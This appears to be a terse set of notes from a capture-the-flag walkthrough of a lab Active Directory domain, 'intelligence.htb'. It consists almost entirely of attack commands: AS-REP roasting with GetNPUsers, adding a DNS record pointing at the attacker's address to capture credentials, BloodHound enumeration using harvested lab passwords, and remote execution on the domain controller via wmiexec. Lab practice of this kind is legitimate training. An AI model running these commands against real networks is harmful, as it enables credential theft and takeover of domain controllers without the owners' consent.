...
/home/rickybana/.local/bin/GetNPUsers.py -no-pass -usersfile users.txt intelligence.htb/
...
# WE will try now to rpc with the credentials and enumerate 
...
python3 dnstool.py -r websavi -a add -t A -d 10.10.14.4 10.10.10.248 -u "intelligence.htb\Tiffany.Molina" -p "NewIntelligenceCorpUser9876"
...
/home/rickybana/.local/bin/bloodhound-python -c All -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb
...
/home/rickybana/.local/bin/wmiexec.py -k -no-pass dc.intelligence.htb
